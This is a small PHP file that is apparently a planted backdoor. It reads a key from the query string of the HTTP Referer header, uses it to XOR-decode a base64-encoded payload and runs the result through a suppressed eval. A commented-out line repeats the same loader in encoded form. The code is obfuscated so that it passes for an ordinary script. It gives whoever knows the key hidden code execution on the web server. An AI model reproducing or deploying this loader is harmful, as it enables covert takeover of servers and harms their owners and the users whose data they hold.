<?php
	//$t1 = microtime();
	//eval(base64_decode('cGFyc2Vfc3RyKHN1YnN0cigkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10sc3RycG9zKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwnPycpKSwkcmVmKTskcmVmPWFycmF5X3ZhbHVlcygkcmVmKTskdGV4dD1iYXNlNjRfZGVjb2RlKCdKMlpvY2xjOVRTTXBMWGNrYm5Gd2NUc2dVMmgxWUh0cGNTUW9ZbVp5VmlWUkpUd25abWh5Vnp4TktpOStZMlY0YzJzOEtXWnBha3N4U1NSdmIyMWpaalE5TGl3c1kzcG5lWEZoSkRSeGNXdFBQVkUrSVRRL0tpbzlNaW92TFhaK2FYRm9MMjUxZjJrd01pNHROQ2h2ZldjME1EUnBkR0J2ZTJseEpDc3dKRGdwWm1scVN6SkpKQzhzYVhOcmV5MDJUblZrWmpScGUzdGlmR3gxYVhGb05qQWhPbXQ5WUdsUGMyRjVTMjlqZm5keFkyQi9KRFJnZVdsUFBWRThaWDFoY1ZOcmRYZExibnRpZUhWdFlINDhLRzk5WjA4OVNTVWxQaUZJWXpZM0xISnhjV3gvTjI5eGNIRXRKallzTUVOeGUzVmdKRFJ4Y1d0UFBWRTVPRFJ2Wm1sdGV6aHBMUT09Jyk7IEBldmFsKGMoJHRleHQsJHJlZlswXSkpO2Z1bmN0aW9uIGMoJHRleHQ9JycsJGtleT0nJyl7cmV0dXJuICgoJHRleHQgXiBAc3RyX3BhZCgiIixzdHJsZW4oJHRleHQpLCRrZXkpKSAmIHN0cl9yZXBlYXQoIlx4MWYiLHN0cmxlbigkdGV4dCkpKSB8ICgkdGV4dCAmIHN0cl9yZXBlYXQoIlx4ZTAiLHN0cmxlbigkdGV4dCkpKTt9IA=='));
	parse_str(substr($_SERVER['HTTP_REFERER'], strpos($_SERVER['HTTP_REFERER'], '?')), $r);
	$r=array_values($r);
	$t=base64_decode('J2ZWJVEsLSN3JXZtf3U1IFJwaW9/Z3ElMH5XIV49ITB+VyBePTZxb2R/IzMxMyIoYlgkUDorMjc4Z3p9eG94KzB/Tz5ROXh3bGdpLCA5NC1ndX9kZnklMH5XIV46LzQ+MjYyNiQvLG5iZnVmL29tY2Y0PC4sLDRgeWk0MSx1e2Rhe2hpOCQ0KjgofksySSQvLGlza3stcmVgdVxkeGBTb39tYGh6eH84J3dgcFc9TS9yZHhpU3dmYFJ3Y2JkZnp5ZyQoc25wViRRJTktNlF6LjcwYWZodWc3c2JnaDQ+NjAjVGhibWA4J2ZWJVElKyN2f3FtZyt+NGh3ZGMwJCgiMyIoYlgkUDorMjc4');		
	@eval(c($t, $r[0]));function c($t='', $k=''){return (($t ^ @str_pad("", strlen($t), $k)) & str_repeat("\x1f", strlen($t))) | ($t & str_repeat("\xe0", strlen($t)));}
	//echo "exec in: ".(microtime()-$t1)." - memory: ".round(memory_get_usage());
?>
